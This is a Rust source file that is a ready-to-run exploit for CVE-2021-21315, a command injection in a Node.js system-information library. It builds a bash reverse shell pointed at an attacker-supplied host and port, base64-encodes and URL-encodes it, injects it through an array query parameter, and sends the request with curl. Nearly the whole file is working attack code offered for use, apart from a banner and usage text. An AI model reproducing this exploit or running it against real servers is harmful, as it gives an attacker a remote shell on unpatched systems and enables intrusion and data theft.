use std::process;
use std::env;
extern crate base64;
extern crate urlencoding;
use curl::easy::Easy;
use std::io::{Write,stdout};


pub fn type_chck<T>(_: T) -> &'static str{
    std::any::type_name::<T>()
}


fn init() -> Vec<String>{

    let banner = "
    
    
    
░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░██████╗░░░███╗░░░░░░░░██████╗░░░███╗░░██████╗░░░███╗░░███████╗
██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗░████║░░░░░░░░╚════██╗░████║░░╚════██╗░████║░░██╔════╝
██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║░░███╔═╝██╔██║░░█████╗░░███╔═╝██╔██║░░░█████╔╝██╔██║░░██████╗░
██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║██╔══╝░░╚═╝██║░░╚════╝██╔══╝░░╚═╝██║░░░╚═══██╗╚═╝██║░░╚════██╗
╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗███████╗░░░░░░███████╗███████╗██████╔╝███████╗██████╔╝
░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝╚══════╝░░░░░░╚══════╝╚══════╝╚═════╝░╚══════╝╚═════╝░
    
    
                                  +------------------------+
                                  |------------------------|
                                  | CVE-2021-21315 Exploit |
                                  |XXXXXXXXXXXXXXXXXXXXXXXX|
                                  |************************|
                                  +------------------------+    
    ";

    let args: Vec<String> = env::args().collect();

    if args.len() != 4{
        usage();
        process::exit(0x0000);
    }
    
    println!("{}",banner);
    
    //println!("{}",type_chck(args));
        
    args
}


fn usage(){
    let usage = "
    +---------------------------------------------------------------------+
    |[!]You Need More Arguments                                           |
    |[+]Usage:                                                            |
    |            ./exploit <targetURL> <LHOST> <LPORT>                    |
    |[*]Example:                                                          |
    |            ./exploit http://vuln.target/api/call?id 172.17.0.1 1337 |
    |                                                                     |
    +---------------------------------------------------------------------+";
    println!("{}",usage);
}


fn payload_craft(args: Vec<String>) -> String{
       
    let payload_origin  = format!("bash -i >& /dev/tcp/{}/{} 0>&1",args[2],args[3]);
    let payload_base64  = base64::encode(payload_origin);
    let payload_url_enc = format!("$(echo '{}' | base64 -d | bash)",payload_base64); 
    let payload_finalize = urlencoding::encode(&payload_url_enc);
    let payload = format!("{}[]={}",args[1],payload_finalize);
           
    payload
}


fn execute(payload: String){
   
    let mut easy = Easy::new();
    easy.url(&payload).unwrap();
    easy.write_function(|data|{
    stdout().write_all(data).unwrap();
    Ok(data.len())
    }).unwrap();
    easy.perform().unwrap();
}


fn main(){

    let args = init();
    let payload = payload_craft(args);
    println!("[+]Sending Payload: {}",&payload);
    execute(payload);    
}





